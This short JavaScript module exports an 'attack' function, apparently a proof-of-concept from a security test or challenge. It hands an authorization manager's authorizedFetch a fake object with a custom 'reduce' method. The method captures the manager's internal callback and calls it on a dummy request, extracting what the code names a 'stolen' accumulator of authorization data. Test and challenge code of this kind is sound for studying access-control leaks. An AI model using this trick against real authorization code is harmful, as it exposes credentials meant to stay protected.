export const attack = (authzManager, success) => {
  authzManager.authorizedFetch({
    reduce: (cb) => {
      const stolenAcc = cb({}, { url: 'z', headers: {} }, 0);
      success(stolenAcc['z']);
      return {};
    },
  });
};
